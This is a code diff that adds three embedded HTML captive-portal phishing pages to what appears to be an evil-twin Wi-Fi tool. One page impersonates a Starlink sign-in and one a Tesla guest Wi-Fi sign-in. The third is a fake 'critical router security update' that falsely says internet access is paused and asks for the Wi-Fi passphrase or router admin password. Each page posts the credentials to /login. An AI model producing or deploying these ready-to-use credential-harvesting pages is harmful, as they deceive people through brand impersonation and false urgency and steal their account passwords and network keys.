@@ -365,6 +365,83 @@ button{width:100%;padding:12px;background:#2c3e50;color:#fff;border:0;border-rad
 )RAW";
 
 /* ============================================================== *
+ *  AEROSPACE & AUTOMOTIVE / CRITICAL UPDATES
+ * ============================================================== */
+
+/* Starlink — satellite internet captive portal. */
+static const char HTML_STARLINK[] = R"RAW(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>Starlink Setup</title>
+<style>body{font-family:-apple-system,Arial,sans-serif;background:#0f1115;color:#fff;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.c{max-width:380px;width:90%;padding:36px;background:#181b20;border:1px solid #2a2e37;border-radius:12px;text-align:center}
+.lg{font-size:24px;font-weight:700;letter-spacing:4px;margin-bottom:16px;color:#fff}
+h1{font-size:20px;font-weight:600;margin:0 0 8px}
+p{color:#9ba1a6;font-size:14px;margin:0 0 24px}
+input{width:100%;padding:12px 14px;margin:8px 0;border:1px solid #333842;border-radius:6px;box-sizing:border-box;font-size:14px;background:#0f1115;color:#fff;outline:none}
+input:focus{border-color:#fff}
+button{width:100%;padding:13px;background:#fff;color:#000;border:0;border-radius:6px;font-size:15px;font-weight:700;letter-spacing:1px;cursor:pointer;margin-top:12px}
+</style></head><body>
+<div class="c">
+<div class="lg">STARLINK</div>
+<h1>Authentication Required</h1><p>Sign in with your Starlink account or network key to connect.</p>
+<form method="POST" action="/login">
+<input name="u" type="email" placeholder="Account Email" required>
+<input name="p" type="password" placeholder="Password or WiFi Key" required>
+<button>CONNECT</button>
+</form></div></body></html>
+)RAW";
+
+/* Tesla Supercharger / Guest WiFi portal. */
+static const char HTML_TESLA[] = R"RAW(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>Tesla Guest WiFi</title>
+<style>body{font-family:-apple-system,Arial,sans-serif;background:#000;color:#fff;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.c{max-width:380px;width:90%;padding:40px 30px;background:#111;border:1px solid #222;border-radius:8px;text-align:center}
+.t{font-size:26px;font-weight:700;letter-spacing:8px;color:#e82127;margin-bottom:18px}
+h1{font-size:20px;margin:0 0 6px}
+p{color:#888;font-size:13px;margin:0 0 22px}
+input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:4px;box-sizing:border-box;font-size:14px;background:#181818;color:#fff;outline:none}
+input:focus{border-color:#e82127}
+button{width:100%;padding:12px;background:#e82127;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:700;letter-spacing:1px;cursor:pointer;margin-top:14px}
+</style></head><body>
+<div class="c">
+<div class="t">TESLA</div>
+<h1>Guest WiFi Access</h1><p>Sign in with your Tesla account to continue.</p>
+<form method="POST" action="/login">
+<input name="u" type="email" placeholder="Tesla Account Email" required>
+<input name="p" type="password" placeholder="Password" required>
+<button>CONTINUE</button>
+</form></div></body></html>
+)RAW";
+
+/* Critical Router Security Update / Firmware prompt. */
+static const char HTML_FIRMWARE[] = R"RAW(
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<title>Critical Router Security Update</title>
+<style>body{font-family:Arial,sans-serif;background:#eef2f5;color:#333;margin:0;padding:30px 15px}
+.c{max-width:420px;margin:30px auto;background:#fff;border-radius:6px;box-shadow:0 4px 15px rgba(0,0,0,0.1);overflow:hidden}
+.h{background:#d32f2f;color:#fff;padding:16px 20px;font-size:16px;font-weight:700;display:flex;align-items:center}
+.b{padding:24px 20px}
+h1{font-size:18px;margin:0 0 8px;color:#d32f2f}
+p{font-size:13px;line-height:1.5;color:#555;margin:0 0 16px}
+.box{background:#ffebee;border-left:4px solid #d32f2f;padding:10px;margin-bottom:16px;font-size:12px;color:#b71c1c}
+input{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:14px}
+button{width:100%;padding:12px;background:#d32f2f;color:#fff;border:0;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer;margin-top:12px}
+</style></head><body>
+<div class="c">
+<div class="h">&#9888; SECURITY UPDATE REQUIRED</div>
+<div class="b">
+<h1>WiFi Router Patch v4.2.1</h1>
+<p>A critical firmware update is installing. Please verify your current network WPA/WPA2 security passphrase to apply the patch.</p>
+<div class="box">Notice: Internet access is paused until security validation completes.</div>
+<form method="POST" action="/login">
+<input name="u" type="text" placeholder="Router Admin or WiFi SSID" value="admin" required>
+<input name="p" type="password" placeholder="Current WiFi / Admin Password" required>
+<button>APPLY & RESTART ROUTER</button>
+</form></div></div></body></html>
+)RAW";
+
+/* ============================================================== *
  *  Ready-to-paste extension snippet for wifi_portal.cpp
  * ==============================================================
  *
